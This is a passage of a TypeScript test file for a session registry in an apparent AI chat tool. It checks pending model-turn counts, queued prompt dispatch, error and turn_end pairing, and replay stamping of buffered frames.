  assert.equal(entry.status, "working", "the original model turn still owns the session");
  assert.equal(entry.modelTurnsPending, 2, "bang lifecycle is not model turn grammar");
  assert.equal(reg.dispatchPrompt(entry, "refused after bang"), false);

  reg.broadcast(entry, { type: "turn_end" });
  assert.equal(entry.status, "working", "the queued turn becomes current without a false-idle boundary");
  assert.equal(entry.modelTurnsPending, 1);
  assert.equal(
    reg.dispatchPrompt(entry, "follow-up for queued turn"),
    true,
    "the new current turn earns one queued-follow-up slot",
  );
  assert.equal(entry.modelTurnsPending, 2);
  reg.broadcast(entry, { type: "turn_end" });
  assert.equal(entry.modelTurnsPending, 1);
  reg.broadcast(entry, { type: "turn_end" });
  assert.equal(entry.status, "idle");
  assert.equal(entry.modelTurnsPending, 0);
  reg.end(entry.id);
});

test("an adapter error plus its turn_end completes one pending turn, not two", () => {
  const { reg, entry } = freshSession();
  assert.equal(reg.dispatchPrompt(entry, "first"), true);
  assert.equal(reg.dispatchPrompt(entry, "queued"), true);
  reg.broadcast(entry, { type: "error", message: "first failed" });
  assert.equal(entry.modelTurnsPending, 1);
  assert.equal(entry.status, "working");
  reg.broadcast(entry, { type: "turn_end" });
  assert.equal(entry.modelTurnsPending, 1, "turn_end pairs with the preceding error");
  assert.equal(entry.status, "working");
  reg.broadcast(entry, { type: "turn_end" });
  assert.equal(entry.modelTurnsPending, 0);
  assert.equal(entry.status, "idle");
  reg.end(entry.id);
});

// 2026-07-29 bughunt: replayed history and live traffic painted identically
// AND fired identical side effects — every reload re-spoke each historical
// turn to screen readers. The registry now stamps `replay: true` on frames
// replayed from the buffer (a copy — the ring itself stays unstamped) so
// clients can suppress live-only side effects.

test("attach-replay stamps replay:true on a copy; live broadcast never carries it", () => {
  const { reg, entry } = freshSession();
  const liveSeen: WireMsg[] = [];
  reg.attach(entry, (m) => liveSeen.push(m));
  reg.broadcast(entry, { type: "user_prompt", text: "hi" });
  reg.broadcast(entry, { type: "turn_end" });
  assert.ok(liveSeen.every((m) => m.replay === undefined));

  const replaySeen: WireMsg[] = [];
  reg.attach(entry, (m) => replaySeen.push(m));
  const replayed = replaySeen.filter((m) => m.type === "user_prompt" || m.type === "turn_end");
  assert.equal(replayed.length, 2);
  assert.ok(replayed.every((m) => m.replay === true), "replayed frames are stamped");
  assert.ok(entry.ring.buffer.every((m) => m.replay === undefined), "the ring itself stays unstamped");
  reg.end(entry.id);
});
